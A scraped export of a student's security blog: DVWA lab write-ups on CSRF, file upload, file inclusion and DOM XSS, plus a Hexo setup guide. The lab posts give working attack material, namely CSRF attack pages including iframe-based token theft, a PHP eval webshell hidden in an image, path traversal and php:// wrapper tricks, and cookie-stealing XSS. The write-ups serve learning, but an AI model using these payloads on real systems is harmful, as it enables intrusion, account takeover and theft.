从源代码可以看出，这是一个修改密码的程序，而$username是取决于中cookie的Username字段值，也就是说，当我们以一个用户身份登录时，服务器会将用户的信息保存在cookie中，下次访问时，就不需要再登录，浏览器直接按之前保存的身份信息登录。这就可能导致了一种CSRF（Cross-site request forgery,跨网站请求伪造）的漏洞，因为修改的密码都是以GET的形式发送给服务器，所以攻击者可以伪造一个url，诱导受害者去点击，受害者一旦点击，如果浏览器之前保存了身份认证信息，用户的密码就会被恶意修改，它与XSS的区别在于，它并没有盗取用户的cookie，而是直接利用用户的cookie，从而完成非法操作。 构造链接： (1)最基础的链接：http://127.0.0.1/demo/CSRF/low-change.php?password_new=hack&amp;password_conf=hack&amp;change=change 当受害者点击了这个链接，他的密码直接就会被修改成hack 但是这种链接简单直白的告诉了稍微看得懂一点url的人…很明显的就是想篡改他的密码，也就只能骗一骗那些完全不懂的小白 需要注意的是，CSRF最关键的就是利用用户的cookie向服务器发送伪造请求，也就是说，如果浏览器未保存用户的身份信息，那受害者点击链接时就会自动进入登录界面，攻击就失效了 有保存用户信息的浏览器，比如Chrome浏览器 Chrome的检查功能可以很明显的看到保存了cookie信息 而有些浏览器未能保存cookie信息，CSRF攻击就实现不了 (2)构造短链接 利用百度短网址系统将网址缩短成一个短网址 由于是本地搭的环境，所以生成不了，实际场景下目标服务器不是域名的话是可以生成短链接的 这种方法虽然链接看起来不像是攻击链接，但是受害者依然能看到修改密码成功的提示信息 (3)构造攻击页面 为了能让用户点击攻击链接，又能不让用户察觉到自己的密码被修改了，我们可以构造一个页面，里面包含了攻击链接，让用户去点击 我们写一个test.html 12345678910111213&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;img src=&quot;http://127.0.0.1/demo/CSRF/low-change.php?password_new=hack&amp;password_conf=hack&amp;change=change&quot; style=&quot;display:none&quot;&gt;&lt;h1&gt;404&lt;/h1&gt;&lt;h2&gt;file not found.&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt; 当受害者访问这个页面时，一个看不见的图片标签就自动访问了修改密码的页面，受害者还误以为自己访问了一个失效的url，实际上自己的密码已经被修改为了hack Medium代码复现如下： 123456789101112131415161718192021222324252627&lt;?phpinclude(&quot;../sql-connection.php&quot;);if(isset($_GET[&apos;change&apos;]))&#123; if(eregi($_SERVER[&apos;SERVER_NAME&apos;],$_SERVER[&apos;HTTP_REFERER&apos;]))&#123; $pass_new=$_GET[&apos;password_new&apos;]; $pass_conf=$_GET[&apos;password_conf&apos;]; $username=$_COOKIE[&apos;Username&apos;]; if($pass_new == $pass_conf)&#123; $pass_new=mysql_real_escape_string($pass_new); $pass_new=md5($pass_new); $sql=&quot;UPDATE users SET password=&apos;$pass_new&apos; WHERE user=&apos;$username&apos;&quot;; $result=mysql_query($sql) or die(mysql_error()); echo &quot;Your password has changed&quot;; &#125; else&#123; echo &quot;Password didn&apos;t match&quot;; &#125; &#125; else&#123; echo &quot;That request didn&apos;t look correct&quot;; &#125;&#125;?&gt; 与上一关的区别在于这里加了一个过滤条件，首先先查一下eregi函数的用法 eregi(string pattern,string string):在一个字符串string中搜索指定模式pattern的字符串，不分大小写，如果匹配成功则返回true，不成功则返回false 再查阅一下全局变量 12$_SERVER[&apos;SERVER_NAME&apos;]:http包头的Host参数，即要访问的主机名$_SERVER[&apos;HTTP_REFERER&apos;]:http包头的Referer参数的值，表示来源地址 看完不理解也没事，我们利用burp抓包看一下就大概明白了 我们先在提交的表单中输入password为hack 然后点击提交 然后用burp抓包 Host值就是要访问的主机名，Referer值就是来源地址 这是在网页中的表单中提交数据，所以来源地址是这个网页的地址 我们最终访问主机名一定是127.0.0.1,所以127.0.0.1一定要出现在Referer值中，这起到了一定的过滤作用，如果受害者访问我们伪造的攻击网站，攻击网站向服务器发出伪造请求，会被服务器检测来源地址，地址中不带127.0.0.1的话，就会被过滤掉，但是这种过滤很好解决，即使不理解上面两个参数的意思，我们只要用burp修改请求头的Host和Referer参数，让两个参数都带有一样的内容就ok了 我们在浏览器中访问http://127.0.0.1/demo/CSRF/medium-change.php?password_new=hack&amp;password_conf=hack&amp;change=change 然后用burp抓包 我们看到请求头中只有Host参数，没有Referer参数，这是因为我们是在空白的页面访问的，所以没有来源地址，这时候点击go 发现请求被过滤了 我们在请求头中添加Referer参数，随便输入一个带127.0.0.1的值 添加Referer参数后修改密码成功 High代码如下： 1234567891011121314151617181920212223242526272829303132333435&lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysql_query( $insert ) or die( &apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; mysql_close(); &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 这关加入了token认证机制，能非常有效的预防CSRF攻击，它的防御过程如下： (1)每当用户登录后会随机产生一段字符串，并且存储在Session或者Cookie中 (2)在敏感操作中加入隐藏标签，value即为Session中保存的字符串，如本关中的表单加入了隐藏标签，提交的内容就是Session中保存的字符串 (3)用户提交请求后，服务器将请求提交的Token字符串与Session中的字符串进行比较，如果一致，则认为是正常请求，否则可能是CSRF攻击 (4)更新Token值 所以，要绕过Token认证，就必要想办法获得存储在Session或者Cookie当中的Token值 破解token认证思路是在攻击页面上利用隐藏的iframe框架访问修改密码的页面，然后用javascript代码获取页面token值再赋值给攻击页面表单，再模拟提交隐藏表单 代码如下： 12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;high-attack&lt;/title&gt;&lt;/head&gt;&lt;script type=&quot;text/javascript&quot;&gt; function attack() &#123; document.getElementsByName(&apos;user_token&apos;)[0].value=document.getElementById(&apos;hack&apos;).contentWindow.document.getElementsByName(&apos;user_token&apos;)[0].value; document.getElementById(&apos;transfer&apos;).submit(); &#125;&lt;/script&gt;&lt;iframe src=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/&quot; id=&apos;hack&apos; border=&apos;0&apos; style=&apos;display:none&apos;&gt;&lt;/iframe&gt;&lt;body onload=&quot;attack()&quot;&gt;&lt;form id=&quot;transfer&quot; method=&apos;get&apos; action=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 然后在浏览器输入攻击页面url，跳转到修改密码的页面 可以看到成功获取token值并修改密码成功","categories":[{"name":"dvwa-CSRF","slug":"dvwa-CSRF","permalink":"https://Foxgrin.github.io/categories/dvwa-CSRF/"}],"tags":[{"name":"CSRF","slug":"CSRF","permalink":"https://Foxgrin.github.io/tags/CSRF/"}]},{"title":"使用Hexo+github搭建属于自己的博客","slug":"使用Hexo+github搭建属于自己的博客","date":"2018-07-12T11:53:00.000Z","updated":"2018-07-12T15:12:14.980Z","comments":true,"path":"/posts/29757/","link":"","permalink":"https://Foxgrin.github.io/posts/29757/","excerpt":"几个月以前，刚刚入门安全，看到了学长的博客，心里想着自己怎么这么low，还在用word记笔记，就一直想要有一个属于自己的博客，奈何时间有限，就一直把这个想法拖后，现在总算是迎来了假期，就下定了决心一定要做一个自己的博客，中间也碰到了无数的坑，无数次想放弃，但是最终在学长的耐心帮助下和不断的上网查询，总算是在今天搭完了自己的博客，并且把之前的笔记上传上来了，现在将我制作过程和碰到的问题及解决方案分享出来","text":"几个月以前，刚刚入门安全，看到了学长的博客，心里想着自己怎么这么low，还在用word记笔记，就一直想要有一个属于自己的博客，奈何时间有限，就一直把这个想法拖后，现在总算是迎来了假期，就下定了决心一定要做一个自己的博客，中间也碰到了无数的坑，无数次想放弃，但是最终在学长的耐心帮助下和不断的上网查询，总算是在今天搭完了自己的博客，并且把之前的笔记上传上来了，现在将我制作过程和碰到的问题及解决方案分享出来 前言在搭建博客之前，还想再多说几句，为什么要搭建自己的博客，在学习过程记笔记是很多人都有的习惯，记笔记的同时也是在整理复习自己学到的东西，实际上就是一个在给别人讲解的过程，很多东西表面上是学到了，但是过几天可能又忘了，记笔记不仅能把学到的总结一遍，在后面忘了的时候也可以再翻出来看，而在一开始的学习过程，我都是用word的形式记笔记，一方面这很low，一方面后面查看很不方便，而博客就很好的解决了这个问题，我们既可以按照自己的想法制作一个高大上的酷炫页面，也可以将自己的文章分类分标签和归档，日后查看明显就方便了很多，而且浏览效果也明显比word好很多，而且学长说过，在将来面试过程中，有一个自己的博客，也可以给自己加分。好了，废话不多说啦，下面马上将我制作博客的过程分享出来~ 开启github pages首先我们先注册一个github账号，登录后新建一个仓库 然后填写仓库的名称和描述，这里一定要注意仓库的名称的格式：你的用户名.github.io 描述属于可选项，填完点击创建仓库即可 然后点击Settings设置 然后往下拉，找到github pages，点击choose a theme选择主题 选择一款自己喜欢的主题（PS：这个可以先随便选，后面还可以更改） 这样，博客首页就做好了 可以先访问一下自己的博客，在浏览器输入 用户名.github.io访问 hexo环境搭建接下来就是用hexo丰富我们的博客主题 首先先安装git 再安装nodejs 两个安装都默认下一步就可以了 安装完成后，创建一个存放hexo组件的目录，我以blog目录为例说明，这个目录就是之后操作博客的目录 然后右键选择git bash here 然后在命令行中输入npm install hexo -g ，开始安装Hexo 输入hexo -v，检查hexo是否安装成功 输入hexo init，初始化文件夹，这里有点慢，可能要耐心等待 完成后显示Start blogging with Hexo这串提示就说明安装成功啦 输入npm install，安装所需要的组件 再将Hexo于Github page 联系起来，设置Git的user name 和email 上图中双引号中的内容替换成自己的用户名和邮箱 然后回到我们创建的存放博客的目录，这时候就发现多了许多目录和文件，在其中找到并打开_config.yml配置文件 来到配置文件的最下方 其中theme是主题的名字，这个我们后面在修改，首先修改#Deployment里面的内容，修改结果为： 上图应注意冒号后有一个空格 修改完成后保存 使用hexo s在本地4000端口开启服务（PS：这个命令很重要，一定要记住，之后我们修改博客都可以用这个命令先预览修改后的博客页面，之后再将改动更新到github上） 在浏览器输入127.0.0.1:4000访问博客主页 看到上图的页面就说明我们的环境已经基本准备好了 使用Hexo修改博客主题经过上面的各种环境搭建，我们的博客可算是基本成形了，接下来就是对博客进行装修，选择一个我们喜欢的主题 我们可以在hexo官方上选择我们喜欢的主题（PS：选择博客主题链接） 选择自己喜欢的主题后点击主题名进入发布人的github 这里以我的博客选择的主题为例 复制主题链接 然后回到blog目录下，找到并进入theme文件夹 右键选择git bash here 输入git clone +你选择的主题链接 下载所选主题 然后可以将主题文件夹名修改成较为简便好记的名字，这里修改成tomotoes 然后在blog目录下的_config.yml配置文件中，也就是刚才说的theme配置 修改成所选的主题名 然后在blog目录下打开git输入hexo s，本地预览效果 可见虽然主题更换了，但是一些css和js特效并没有显示出来，可能是这个主题需要特殊的一些配置文件，这时候我们就需要进入设计者的github主页中寻找接下来需要的设置 修改主题配置我们来到设计者的github页面，在主题下载链接下方会发现一个主题配置的要求 接下来就要仔细阅读这些要求，这里还是以我的主题为例 在Readme.md文件中有一些主题脚本或者css显示所需的配置安装 按照上面的配置命令逐一安装，这里就不一一说明了 安装完成后再次运行hexo s 再来看看页面 可以看出脚本效果都成功的加载出来了，接下来就是根据需求修改主题的配置了 首先我们还是来到blog文件夹下的_config.yml配置文件 在一开始的地方，我们可以修改一些博客的基本信息 各个配置说明如下： 1234567title: your titlesubtitle: your subtitledescription: your descriptionkeywords: your keywordsauthor: your nameemail: your emailurl: your site url 修改完成后，就可以修改我们下载的主题的配置文件了，同样在所选主题文件夹里找到_config.yml配置文件 这里可以根据官网上的说明修改，也不一一说明了 修改完成后，我们博客的基本布局信息都已经完成了 上传文章接下来我们就可以尝试上传文章了 这里需要注意的是我们所有上传的文章都要放在/blog/source/_posts目录下，且文章的格式都必须是md 下面是我上传的文章： 再简单的总结一下一些常用的md文件的格式： (1)文件开头： 1234567---title: xxxtags: xxxcategories: xxxdescription: xxxdate: 2018/7/12 22:00:00--- (2)文章摘要： 1xxx&lt;!--more--&gt; (3)图片插入： 1![](/img/1.png) （PS：在/blog/source目录下创建img文件夹，以后上传到文章的图片都保存在这里面） (4)http链接插入： 1[内容](https://) (5)代码区：三个` (6)标题设置： 1234567891011# 一阶标题 ##二阶标题 ###三阶标题 ####四阶标题 #####五阶标题 ######六阶标题 这里md文件的编写，我强烈推荐使用Typora编辑器 最后，一切改动完成后，在blog目录下打开git，输入hexo d –g命令将改动更新到github上即可 问题及解决方法(1)输入hexo d –g 提示找不到git 解决方法：输入npm install –save hexo-deployer-git (2)点击主页或者归档显示找不到页面 解决方法： 1)开启标签页： 1$ hexo new page tags 执行完成会发现/blog/source下面多了tags文件夹，里面有一个index.md文件，在文件头内容中添加： 12layout: tagscomments: false 2)开启分类页 1$ hexo new page categories 在index.md文件头内容中添加： 12layout: categoriescomments: false 3)开启关于页 1$ hexo new page about 在index.md文件头内容中添加： 123layout: aboutcomments: truereward: false PS：可能不同主题的配置命令不一样，具体参考主题官网 (3)关于设置文章唯一链接abbrlink，注意编写md文件时一定要确保未开启hexo s命令，否则会导致保存md文件后自动生成新的md文件，原来的内容全部都会消失 参考链接到这里博客就基本全部搭建完毕了，最后附上几个搭建的参考链接： (1)https://mochazz.github.io/2017/07/26/hexo-build/ (2)http://www.cnblogs.com/fengxiongZz/p/7707568.html (3)Typora使用参考手册:https://blog.csdn.net/SIMBA1949/article/details/79001226","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://Foxgrin.github.io/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://Foxgrin.github.io/tags/Hexo/"}]},{"title":"dvwa-file upload","slug":"dvwa-file-upload","date":"2018-07-12T08:27:00.000Z","updated":"2018-07-12T11:00:13.099Z","comments":true,"path":"/posts/40994/","link":"","permalink":"https://Foxgrin.github.io/posts/40994/","excerpt":"总结了dvwa中的文件上传漏洞关卡","text":"总结了dvwa中的文件上传漏洞关卡 Low代码复现如下： 1234567891011121314&lt;?phpif(isset($_POST[&apos;upload&apos;]))&#123; $target_path=&quot;C:/phpStudy/PHPTutorial/WWW/demo/file-upload/uploaded/&quot;; $target_path .= basename($_FILES[&apos;file&apos;][&apos;name&apos;]); if(!move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$target_path))&#123; echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; &#125; else&#123; echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125;&#125;?&gt; 这部分内容涉及文件上传，我们先认识一下如何上传一个文件到服务器 表单标签部分： 123456789&lt;form action=\"\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;p&gt;Choose an image to upload:&lt;/p&gt; &lt;p&gt; &lt;input type=\"file\" name=\"file\"&gt; &lt;/p&gt; &lt;p&gt; &lt;input type=\"submit\" name=\"upload\" value=\"upload\"&gt; &lt;/p&gt;&lt;/form&gt; 这里特别注意的是form标签中的entype属性规定了提交表单后如何对提交的数据进行编码，在表单需要提交二进制数据时，比如文件内容，要使用“multipart/form-data” 同时这里用了一个全局变量$_FILES 举个例子说明用法 1234567891011&lt;?phpif(isset($_POST[&apos;upload&apos;]))&#123; echo &apos;name:&apos;.$_FILES[&apos;file&apos;][&apos;name&apos;].&apos;&lt;br&gt;&apos;; echo &apos;type:&apos;.$_FILES[&apos;file&apos;][&apos;type&apos;].&apos;&lt;br&gt;&apos;; echo &apos;tmp_name:&apos;.$_FILES[&apos;file&apos;][&apos;tmp_name&apos;].&apos;&lt;br&gt;&apos;; echo &apos;size:&apos;.$_FILES[&apos;file&apos;][&apos;size&apos;].&apos;&lt;br&gt;&apos;; echo basename($_FILES[&apos;file&apos;][&apos;name&apos;]);&#125;?&gt; 这里需要注意服务器接受的POST参数是upload，全局变量$_FILES，代表了上传到服务器的文件信息 其中12345678$_FILES[‘file‘][‘name’] : 代表上传文件的名称$_FILES[‘file’][‘size’] : 代表上传文件的大小$_FILES[‘file’][‘tmp_name’] : 代表上传的文件存储的临时路径$_FILES[‘file’][‘type’] : 代表上传文件的类型 我们上传一个png文件试试 basename函数返回的是文件名，如果参数省略，则返回的文件名包含后缀 1echo basename($_FILES['file']['name'],'.png'); 如果过滤掉.png后缀名，则上传png文件是不会返回.png的后缀名 move_uploaded_file函数作用是将我们上传的文件从临时目录移动到指定目录下，成功返回true,失败则返回false 我们试着上传一个png文件 看出上传成功 由于这里对我们上传的文件没有任何的检查，过滤等操作，因此我们可以上传任意木马文件，得到webshell，这就是文件上传漏洞 我们上传一句话木马到服务器，文件名为test.php 一句话木马代码为： 1&lt;?php eval($_POST['apple']); ?&gt; 打开中国菜刀 输入文件名所在地，然后POST的参数名称为apple 然后菜刀就会向服务器发送包含apple参数的POST请求，最终获得服务器的webshell权限 Medium代码复现如下： 1234567891011121314151617181920212223&lt;?phpif(isset($_POST[&apos;upload&apos;]))&#123; $name=$_FILES[&apos;file&apos;][&apos;name&apos;]; $size=$_FILES[&apos;file&apos;][&apos;size&apos;]; $type=$_FILES[&apos;file&apos;][&apos;type&apos;]; if(($type == &quot;image/png&quot; || $type == &quot;image/jpeg&quot;) &amp;&amp; $size &lt; 100000)&#123; $target_path=&quot;C:/phpStudy/PHPTutorial/WWW/demo/file-upload/uploaded/&quot;; $target_path .= basename($name); if(!move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$target_path))&#123; echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; &#125; else&#123; echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else&#123; echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; &#125;&#125;?&gt; 这关对上传文件进行了一些过滤，可以看出只能上传jpg和png为后缀名的文件，并且文件大小不能超过100000B，因为我们上传的是一句话木马文件，所以不用担心文件大小超过限制，现在要考虑的是如何绕过后缀名的限制 我们先试着把一句话木马文件后缀名改为图片文件，然后上传 可以看到上传成功 那么我们打开中国菜刀，看看能不能获得webshell 获取webshell失败 可见图片文件是不行的，执行不了POST到服务器的命令 那么我们可以考虑用burp抓包，将文件名修改为test.php 可以看到我们上传的文件类型是png，是图片文件，符合条件上传成功，但是因为上传后图片就是png文件，所以菜刀POST到服务器的相关命令无法执行，所以我们要将上传成功后的文件名修改为php文件，这样就可以成功执行命令 成功上传，再上菜刀 成功获得webshell High代码复现如下： 123456789101112131415161718192021222324&lt;?phpif(isset($_POST[&apos;upload&apos;]))&#123; $name=$_FILES[&apos;file&apos;][&apos;name&apos;]; $tmp_name=$_FILES[&apos;file&apos;][&apos;tmp_name&apos;]; $size=$_FILES[&apos;file&apos;][&apos;size&apos;]; $txt=substr($name,strrpos($name,&apos;.&apos;)+1); if((strtolower($txt) == &apos;jpg&apos; || strtolower($txt) == &apos;jpeg&apos; || strtolower($txt) == &apos;png&apos;) &amp;&amp; $size &lt; 100000 &amp;&amp; getimagesize($tmp_name))&#123; $target_path=&quot;C:/phpStudy/PHPTutorial/WWW/demo/file-upload/uploaded/&quot;; $target_path .= basename($name); if(!move_uploaded_file($tmp_name,$target_path))&#123; echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; &#125; else&#123; echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else&#123; echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; &#125;&#125;?&gt; 先了解几个函数 strpos：搜索字符串在另一字符串中第一次出现的位置（区分大小写） stripos：搜索字符串在另一字符串中第一次出现的位置（不区分大小写） strrpos：搜索字符串在另一字符串中最后一次出现的位置（区分大小写） strripos：搜索字符串在另一字符串中最后一次出现的位置（不区分大小写） 举个例子说明： 1234567891011&lt;?php$str=\"I love php,the greatest language is php.\";echo stripos($str,'PHP').\"&lt;br&gt;\";echo strpos($str,'PHP').\"&lt;br&gt;\";echo strrpos($str,'PHP').\"&lt;br&gt;\";echo strrpos($str,'php').\"&lt;br&gt;\";echo strripos($str,'PHP').\"&lt;br&gt;\";?&gt; 执行结果： 而getimagesize函数会检测上传文件头，如果不包含相关的图片文件头，则报错 也就是说我们上传的文件名后缀必须是jpg,jepg,png，而且文件头必须是图像类型 在上一关中，是对上传文件的类型进行检查，如果不是图片类型则过滤，所以我们可以用burpsuite将发向服务器的请求中的文件名改为.php的后缀，这样类型依然是图片，就能巧妙的绕过过滤 而这一关是对上传文件的名字进行了检查，名字的后缀必须是.jpg或者.png或者.jpeg，而且文件的头信息必须是图片，上一关的方法修改文件名明显行不通，也就是说我们必须老实上传一个图片文件 但是我们可以将php代码加入到图片中 我们先创建一个一句话木马文件和一个图片文件 再打开cmd，利用copy命令将两个文件合并为一个文件 打开合并后的文件可以看到，一句话木马被加到了最后 然后上传 成功通过检查 接下来打开菜刀 右键添加 http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file:///C:/phpStudy/PHPTutorial/WWW/dvwa/hackable/uploads/hack.jpg 参数名写apple，脚本语言选择php 成功拿到webshell","categories":[{"name":"dvwa-file upload","slug":"dvwa-file-upload","permalink":"https://Foxgrin.github.io/categories/dvwa-file-upload/"}],"tags":[{"name":"file upload","slug":"file-upload","permalink":"https://Foxgrin.github.io/tags/file-upload/"}]},{"title":"dvwa-file inclusion","slug":"dvwa-file-inclusion","date":"2018-07-11T14:16:00.000Z","updated":"2018-07-12T08:27:35.166Z","comments":true,"path":"/posts/13543/","link":"","permalink":"https://Foxgrin.github.io/posts/13543/","excerpt":"总结了dvwa中的文件包含漏洞的关卡","text":"总结了dvwa中的文件包含漏洞的关卡 Low代码复现如下： 12345678910&lt;?phpif(isset($_GET[&apos;page&apos;]))&#123; include($_GET[&apos;page&apos;]);&#125;else&#123; header(&quot;location:?page=include.php&quot;);&#125;?&gt; 从源代码可以看出，当用户没有GET一个page值时，会自动给page赋值一个include.php，而这个include.php中就包含了三个文件给用户选择，希望用户能点击这三个文件进行文件包含 但是从攻击者的角度来看，当然不会乖乖的去点击这三个文件，因为page参数是不经过过滤，我们可以读取我们想要读的文件，前提是文件存在对应的目录。 我们先要清楚，如果包含的是php文件，则正确包含，如果不是php文件，则原封不动的将文件内容输出到页面上 这里说的php文件不一定是后缀名是php的文件，任何后缀文件只要里面包含了符合php语法的语句，通过文件包含函数include后，里面合法的代码就会被执行 举个例子，我们先在目录中创建一个phpinfo.txt 文件内容是： 1&lt;?php phpinfo(); ?&gt; 然后给服务器GET一个page值为phpinfo.txt 发现正常显示phpinfo信息，由此可知，只要文件内容符合php语法规范，那么任何扩展名都可以被php解析 再将phpinfo.txt信息修改为非php语法规范的语句 同样给服务器GET一个page值为phpinfo.txt 发现暴露其源代码 所以我们可以利用这个特性，查看一些配置文件信息 首先要想查看文件信息，必定要弄清楚目录 我们先随便输入一个xxx.php 发现这个文件不存在，报错了，但同时把文件的绝对路径爆出来了 知道文件路径后，我们就可以查看一些配件文件，比如php配置信息 输入http://127.0.0.1/demo/file-inclusion/low.php?page=C:\\phpStudy\\PHPTutorial\\WWW\\dvwa/php.ini 或者输入../../../../../../../phpStudy/PHPTutorial/WWW/dvwa/php.ini 输入这么多的../是为了保证能回到根目录下 再看一下mysql配置信息 输入http://127.0.0.1/demo/file-inclusion/low.php?page=C:\\phpStudy\\PHPTutorial\\mysql\\my.ini 还可以使用php内置封装协议来读取php文件 输入?php://filter/read=convert.base64-encode/resource=include.php 发现一段被base64加密过后的php源代码，经过解密后就可以得到php文件原本的代码 再用php://input写入php命令，前提是allow_url_include选项要为on 在burpsuite中提交数据 发现提交的命令被执行了，那么是不是可以像xss一样提交恶意的脚本代码呢 我们提交 1&lt;script&gt;alert(‘xss’)&lt;/script&gt; 发现成功执行 我们再看看可不可以窃取cookie 输入 1&lt;?php echo\"&lt;script src='http://127.0.0.1/demo/xss(stored)/cookie.js'&gt;&lt;/script&gt;\" ?&gt; 发现成功跳转到steal.php 成功窃取到cookie值 Medium代码复现如下： 1234567891011121314&lt;?phpif(isset($_GET[&apos;page&apos;]))&#123; $page=$_GET[&apos;page&apos;]; $page=str_replace(array(&apos;http://&apos;,&apos;https://&apos;),&apos;&apos;,$page); $page=str_replace(array(&quot;../&quot;,&quot;..\\&quot;&quot;),&apos;&apos;,$page); //echo $page.&quot;&lt;br&gt;&quot;; include($page);&#125;else&#123; header(&quot;location:?page=include.php&quot;);&#125;?&gt; 可以看出对http:// 和https://，../和..\\有过滤，但是因为是str_replace函数，所以双写即可绕过 而且如果读取绝对路径的话，就没有什么影响 先看一下当前php文件的绝对路径 复写../构造路径读取php配置文件 读取mysql配置文件 使用php内置协议读取文件 任意命令执行 High代码复现如下： 123456789101112131415&lt;?phpif(isset($_GET[&apos;page&apos;]))&#123; $page=$_GET[&apos;page&apos;]; if(!fnmatch(&apos;file*&apos;,$page) &amp;&amp; $page != &apos;include.php&apos;)&#123; echo &quot;ERROR:File not found&quot;; exit; &#125; include($page);&#125;else&#123; header(&quot;location:?page=include.php&quot;);&#125;?&gt; Fnmatch函数作用是在page值中搜索指定模式，指定必须以file开头的字符串才返回true，而我们要执行include，就必须不让if语句执行，所以page值必须以file开头 看似完全限制了，但是我们可以用file协议进行读取文件","categories":[{"name":"dvwa-file inclusion","slug":"dvwa-file-inclusion","permalink":"https://Foxgrin.github.io/categories/dvwa-file-inclusion/"}],"tags":[{"name":"file inclusion","slug":"file-inclusion","permalink":"https://Foxgrin.github.io/tags/file-inclusion/"}]},{"title":"dvwa-xss(dom)","slug":"dvwa-xss(dom)","date":"2018-07-11T13:38:00.000Z","updated":"2018-07-11T14:11:08.637Z","comments":true,"path":"/posts/61192/","link":"","permalink":"https://Foxgrin.github.io/posts/61192/","excerpt":"总结了dvwa中的dom型xss关卡","text":"总结了dvwa中的dom型xss关卡 Low代码复现如下： 12345678910111213141516171819202122232425&lt;form name=&quot;XSS&quot; method=&quot;get&quot;&gt; &lt;p&gt;Please choose a language:&lt;/p&gt; &lt;select name=&quot;default&quot;&gt; &lt;script&gt; if(document.location.href.indexOf(&apos;default=&apos;)&gt;=0)&#123; var lang = document.location.href.substring(document.location.href.indexOf(&apos;default=&apos;)+8); document.write(&quot;&lt;option value=&apos;&quot;+lang+&quot;&apos;&gt;&quot;+decodeURI(lang)+&quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;); &#125; document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;); &lt;/script&gt; &lt;/select&gt; &lt;input type=&apos;submit&apos; value=&apos;Select&apos;&gt;&lt;/form&gt;&lt;?phpsession_start();setcookie(&apos;security&apos;,&apos;low&apos;,time()+3600);?&gt; 这关没有php代码，但是我们可以仔细一步步分析js代码 首先明白几个对象： document:每个载入浏览器的html文档都会成为document对象 location:location对象包含了当前相关的url信息，href是location对象的属性，location.href能返回完整的URL 几个方法： indexOf：string.indexOf(searchvalue)返回搜索的子字符串在原字符串中第一次出现 的位置，如果搜索的字符串不存在，则返回-1 substring:string.substring(start，stop)提取字符串中介于两个指定下标之间的字符 从start处开始提取，到stop位置但不包括stop位置的字符，如果stop参数省略，则返回从start处开始到结束的字符 明白了这几个对象和方法后再来看这串js代码 If语句执行条件是检查url中是否含有’default=’这个字符串，如果有则执行if语句 也就是说if语句执行条件是必须通过GET方式传入一个default值才会执行if语句 执行之后定义一个变量lang，存储的是url中’default=’之后到结束的字符，也就是default的值 之后将lang进行url解码然后写入option标签中 这里没有php代码，也就是并没有与服务器交互，但是我们可以通过dom树解析js代码进行xss注入，也就是通过GET一个default值注入JS代码，然后执行if语句，就可以执行我们注入的JS代码，这就属于dom型的xss 于是我们输入default: 1&lt;script&gt;alert(“xss”)&lt;/script&gt; 果然出现了弹窗 接下来考虑窃取cookie值 按之前的方法利用ajax将cookie值传入steal.php，再将cookie值写入数据库 成功截取到cookie值 Medium代码复现如下： 12345678910111213141516171819202122232425262728293031&lt;form name=&quot;XSS&quot; method=&quot;get&quot;&gt; &lt;p&gt;Please choose a language:&lt;/p&gt; &lt;select name=&quot;default&quot;&gt; &lt;script&gt; if(document.location.href.indexOf(&quot;default=&quot;)&gt;=0)&#123; var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8); document.write(&quot;&lt;option 